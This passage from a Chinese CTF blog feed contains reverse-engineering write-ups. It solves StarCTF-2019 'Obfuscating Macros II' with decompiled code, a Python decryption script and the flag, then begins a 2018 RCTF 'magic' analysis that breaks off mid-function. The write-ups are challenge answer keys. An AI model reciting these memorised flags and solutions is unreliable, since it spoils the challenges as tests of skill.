class="headerlink" title="Obfuscating Macros II"></a>Obfuscating Macros II</h2><p>题目:[Obfuscating Macros II](<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/StarCTF-2019/Obfuscating">https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/StarCTF-2019/Obfuscating</a> Macros II.zip)</p><p>根据题目混淆宏emmmmmm不懂</p><p>运行下程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./obfuscating_macros_II.out</span><br><span class="line">sss</span><br><span class="line">Failed</span><br></pre></td></tr></table></figure><p>IDA打开找到main函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v21 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string();</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::length();</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str();</span><br><span class="line">  v5 = *v4;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str();</span><br><span class="line">  encrypto(v5, *(_QWORD *)(v6 + <span class="number">8</span>));</span><br><span class="line">  v18 = v7;</span><br><span class="line">  v19 = v8;</span><br><span class="line">  sub_40465C(&amp;v16, (__int64)&amp;v18);</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v16);</span><br><span class="line">  v11 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v10, (__int64)&amp;byte_407D38);</span><br><span class="line">  v12 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, v9);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( v16 != <span class="number">0xA1E8895EB916B732</span>LL || v17 != <span class="number">0x50A2DCC51ED6C4A2</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">    v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((__int64)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>, <span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;, <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v20);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>根据调试:</p><p>首先判断输出长度是否为16:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 != <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br></pre></td></tr></table></figure><p>接着进入encrypto函数进行加密, 加密后判断:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v16 != <span class="number">0xA1E8895EB916B732</span>LL || v17 != <span class="number">0x50A2DCC51ED6C4A2</span>LL )</span><br></pre></td></tr></table></figure><p>重点就是在encrypto函数咯。</p><h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><p>进去以后发现根本看不懂….调试大法好！</p><p>首先是将输入切成两段, 长度为8:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190720160232.png" alt="input"></p><p>接着在栈里面看哪里对这两块地方进行了操作, 这里我输入了11111111AAAAAAAA:</p><p>得到:</p><p>首先来到了v16 = 0, 判断v16 &lt;= 0x3FF, 那么回到这里就是一个循环咯:</p><p>接着第一段取反</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v8 = ~v7;</span><br></pre></td></tr></table></figure><p>接着</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(v7&amp;<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>为真则</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v8^=*v5</span><br></pre></td></tr></table></figure><p>这里看到v8 指向了v6, v5 指向了v7</p><p>接下来就是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v6 = v8</span><br><span class="line">v7 ~= v7</span><br></pre></td></tr></table></figure><p>再接着根据调试不难发现, 接下来就是对整一个128位字符进行循环左移1位.</p><p>因为一开始<code>if(v7&amp;1)</code>为真, 这次我们输00000000AAAAAAAA:</p><p>得到<code>v8^=*v5</code>此时v5变成了指向~v7, 而之后就都一样了。</p><p>不难写出加密算法:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Andf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span> &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rol</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    a = str1 &gt;&gt; <span class="number">63</span></span><br><span class="line">    b = str2 &gt;&gt; <span class="number">63</span></span><br><span class="line">    str2 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    str1 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    str2 |= a</span><br><span class="line">    str1 |= b</span><br><span class="line">    str1, str2 = Andf(str1), Andf(str2)</span><br><span class="line">    <span class="keyword">return</span> str1, str2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypto</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> str1&amp;<span class="number">1</span>:</span><br><span class="line">        str2 ^= str1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str2 ^= (~str1)</span><br><span class="line">    str1 = (~str1)</span><br><span class="line">    str1 = Andf(str1)</span><br><span class="line">    str2 = Andf(str2)</span><br><span class="line">    str1, str2 = Rol(str1, str2)</span><br><span class="line">    tmp = str2</span><br><span class="line">    str2 += str1</span><br><span class="line">    str2 = Andf(str2)</span><br><span class="line">    str1 = tmp</span><br><span class="line">    str1, str2 = Rol(str1, str2)</span><br><span class="line">    <span class="keyword">return</span> str1, str2</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>):</span><br><span class="line">   str1, str2 = Encrypto(str1, str2)</span><br></pre></td></tr></table></figure><p>则解密脚本为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Andf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span> &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Ror</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    a = (str1 &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">63</span></span><br><span class="line">    b = (str2 &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">63</span></span><br><span class="line">    str2 &gt;&gt;= <span class="number">1</span></span><br><span class="line">    str1 &gt;&gt;= <span class="number">1</span></span><br><span class="line">    str1 |= b</span><br><span class="line">    str2 |= a</span><br><span class="line">    str1, str2 = Andf(str1), Andf(str2)</span><br><span class="line">    <span class="keyword">return</span> str1, str2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypto</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    str1, str2 = Ror(str1, str2)</span><br><span class="line">    tmp = str2</span><br><span class="line">    tmp -= str1</span><br><span class="line">    tmp = Andf(tmp)</span><br><span class="line">    str2 = str1</span><br><span class="line">    str1 = tmp</span><br><span class="line">    str1, str2 = Ror(str1, str2)</span><br><span class="line">    str1 = (~str1)</span><br><span class="line">    str1 = Andf(str1)</span><br><span class="line">    <span class="keyword">if</span> str1&amp;<span class="number">1</span>:</span><br><span class="line">        str2 ^= str1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        str2 ^= (~str1)</span><br><span class="line">    str2 = Andf(str2)</span><br><span class="line">    <span class="keyword">return</span> str1, str2</span><br><span class="line"></span><br><span class="line">str1 = <span class="number">0xA1E8895EB916B732</span></span><br><span class="line">str2 = <span class="number">0x50A2DCC51ED6C4A2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>):</span><br><span class="line">   str1, str2 = Decrypto(str1, str2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(str1), hex(str2))</span></span><br><span class="line"></span><br><span class="line">str1 = [<span class="number">0x6e</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x7b</span>, <span class="number">0x46</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0x2a</span>][::-<span class="number">1</span>]</span><br><span class="line">str2 = [<span class="number">0x7d</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x43</span>, <span class="number">0x74</span>, <span class="number">0x40</span>, <span class="number">0x6c</span>, <span class="number">0x66</span>][::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">str</span> = str1 + str2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, <span class="built_in">str</span>)))</span><br></pre></td></tr></table></figure><p>得到flag:</p><p>*CTF{fUnfl@tCf9}</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./obfuscating_macros_II.out</span><br><span class="line">*CTF&#123;fUnfl@tCf9&#125;</span><br><span class="line">11666725874628474674 5810449208445420706</span><br><span class="line">Congratulations!</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 RCTF</title>
      <link href="/wp-games-2018rctf/"/>
      <url>/wp-games-2018rctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>2020.05.05 嗯, 立下flag, 有空一定补其他题</li></ul><h2 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/RCTF-magic/magic.exe">magic</a></p><p>本题大概有三个任务: 1.找到真正的main函数</p><p>2.算出运行时间</p><p>3.RC4+VM逆向还原</p><p>寻找真正的main函数<br>拿到题, 运行一下, 输出如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Downloads&gt;magic.exe</span><br><span class="line">flag only appears at a specific time, range [2018-05-19 09:00, 2018-05-21 09:00)</span><br><span class="line">Better luck next time :)</span><br></pre></td></tr></table></figure><p>用IDA打开, 根据交叉引用即可找到真正的main函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// write access to const memory has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4011B0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v12; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">size_t</span> v15; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v18; <span class="comment">// r13</span></span><br><span class="line">  __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">size_t</span> v20; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+20h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+5Ch] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v26; <span class="comment">// [rsp+60h] [rbp-68h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v24;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v24, <span class="number">0</span>, <span class="number">0x68</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( unk_409670 )</span><br><span class="line">    GetStartupInfoA((LPSTARTUPINFOA)&amp;unk_409670);</span><br><span class="line">  _RBX = &amp;unk_409AF8;</span><br><span class="line">  v2 = *(_QWORD *)(__readgsqword(<span class="number">0x30</span>u) + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _InterlockedCompareExchange((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int64 *)&amp;unk_409AF8, v2, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = &amp;unk_409AF0;</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( unk_409AF0 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Sleep((<span class="keyword">unsigned</span> __int64)&amp;unk_409670);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = &amp;unk_409AF0;</span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( unk_409AF0 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_42:</span><br><span class="line">    amsg_exit(&amp;unk_409670, &amp;unk_409AF0, v0, <span class="number">31LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( unk_409AF0 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">LABEL_11:</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_44;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="keyword">if</span> ( unk_409AF0 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_409004 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_409AF0 = <span class="number">1</span>;</span><br><span class="line">    initterm(&amp;unk_409670, &amp;unk_409AF0, &amp;unk_40B030, &amp;unk_40B018);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_409AF0 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">LABEL_43:</span><br><span class="line">  initterm(&amp;unk_409670, &amp;unk_409AF0, &amp;unk_40B010, &amp;unk_40B000);</span><br><span class="line">  unk_409AF0 = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">LABEL_44:</span><br><span class="line">  _RAX = <span class="number">0LL</span>;</span><br><span class="line">  __asm &#123; xchg    rax, [rbx] &#125;</span><br><span class="line">LABEL_12:</span><br><span class="line">  <span class="keyword">if</span> ( TlsCallback_0 )</span><br><span class="line">    TlsCallback_0(&amp;unk_409670, &amp;unk_409AF0, <span class="number">2LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_403940(&amp;unk_409670, &amp;unk_409AF0, v0);</span><br><span class="line">  qword_4096A0 = (__int64)SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&amp;unk_409670);</span><br><span class="line">  sub_403DA0();</span><br><span class="line">  sub_404850(&amp;unk_409670, &amp;unk_409AF0, v6, nullsub_1);</span><br><span class="line">  sub_403740();</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  qword_4099C8 = <span class="number">0x400000</span>LL;</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)acmdln;</span><br><span class="line">  <span class="keyword">if</span> ( acmdln )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = *v8;</span><br><span class="line">      <span class="keyword">if</span> ( *v8 &lt;= <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !v9 || !(v7 &amp; <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              ++v8;</span><br><span class="line">            <span class="keyword">while</span> ( *v8 &amp;&amp; *v8 &lt;= <span class="number">32</span> );</span><br><span class="line">          &#125;</span><br><span class="line">          qword_4099C0 = (__int64)v8;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="number">34</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 ^= <span class="number">1u</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_409670 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v25 &amp; <span class="number">1</span> )</span><br><span class="line">      v10 = v26;</span><br><span class="line">    dword_405000 = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = dword_409020;</span><br><span class="line">  v12 = <span class="number">8LL</span> * (dword_409020 + <span class="number">1</span>);</span><br><span class="line">  v13 = <span class="built_in">malloc</span>((<span class="keyword">size_t</span>)&amp;unk_409670);</span><br><span class="line">  v14 = (<span class="keyword">char</span> *)Code;</span><br><span class="line">  v15 = (<span class="keyword">size_t</span>)v13;</span><br><span class="line">  <span class="keyword">if</span> ( v11 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v11 - <span class="number">1</span>);</span><br><span class="line">    v17 = <span class="number">0LL</span>;</span><br><span class="line">    v18 = <span class="number">8</span> * v16 + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v19 = *(_QWORD *)&amp;v14[v17];</span><br><span class="line">      v4 = (<span class="keyword">void</span> *)(<span class="built_in">strlen</span>(v14) + <span class="number">1</span>);</span><br><span class="line">      *(_QWORD *)(v15 + v17) = <span class="built_in">malloc</span>((<span class="keyword">size_t</span>)v14);</span><br><span class="line">      v20 = *(_QWORD *)&amp;v14[v17];</span><br><span class="line">      v17 += <span class="number">8LL</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14, v4, v20);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v18 != v17 );</span><br><span class="line">    v13 = (_QWORD *)(v15 + v12 - <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *v13 = <span class="number">0LL</span>;</span><br><span class="line">  Code = v15;</span><br><span class="line">  sub_403310((__int64)v14, (__int64 *)v4);<span class="comment">//real入口点0.0</span></span><br><span class="line">  _initenv = qword_409010;</span><br><span class="line">  result = main((<span class="keyword">int</span>)v14, (<span class="keyword">const</span> <span class="keyword">char</span> **)v4, (<span class="keyword">const</span> <span class="keyword">char</span> **)Code);</span><br><span class="line">  dword_40900C = result;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_409008 )</span><br><span class="line">    <span class="built_in">exit</span>((<span class="keyword">int</span>)v14);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_409004 )</span><br><span class="line">  &#123;</span><br><span class="line">    cexit();</span><br><span class="line">    result = dword_40900C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进去sub_403310函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_403310</span><span class="params">(__int64 a1, __int64 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_4090A0;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_4090A0 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_4090A0 = <span class="number">1</span>;</span><br><span class="line">    result = sub_4032A0(a1, a2);<span class="comment">//这里进去</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4032A0</span><span class="params">(__int64 a1, __int64 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  __int64 *v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v2 = qword_4049A0[<span class="number">0</span>];</span><br><span class="line">  i = qword_4049A0[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(qword_4049A0[<span class="number">0</span>]) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !qword_4049A0[v2] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;qword_4049A0[i];</span><br><span class="line">    a2 = &amp;qword_4049A0[i - (<span class="keyword">unsigned</span> __int64)(i - <span class="number">1</span>) - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(__int64, __int64 *))*v4)(a1, a2);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 != a2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_403240(a1, a2, v2, sub_403260);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>qword_4049A0存放了两个函数的地址:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qword_4049A0    dq 0FFFFFFFFFFFFFFFFh, 402357h, 404990h, 0</span><br></pre></td></tr></table></figure><p>进去sub_402357</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_402357</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">char</span> **a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ST2C_4</span></span><br><span class="line"></span><br><span class="line">  Time((__int64)a1, (__int64)a2);<span class="comment">//第一步, 时间验证</span></span><br><span class="line">  result = dword_4099D0[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !dword_4099D0[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = strtol(a1, a2, <span class="number">0</span>) ^ <span class="number">0xBADD1917</span>;</span><br><span class="line">    result = sub_402218((__int64)a1, (_DWORD)a2, <span class="number">105</span>, (<span class="keyword">unsigned</span> __int64)&amp;unk_405220);<span class="comment">//输出flag only.....</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Time正是这个程序的第一步验证:时间验证</p><p>而sub_402218则是输出信息的位置。</p><p>以上由调试可知, 就不赘述了。</p><p>时间验证</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Time</span><span class="params">(<span class="keyword">__time64_t</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] 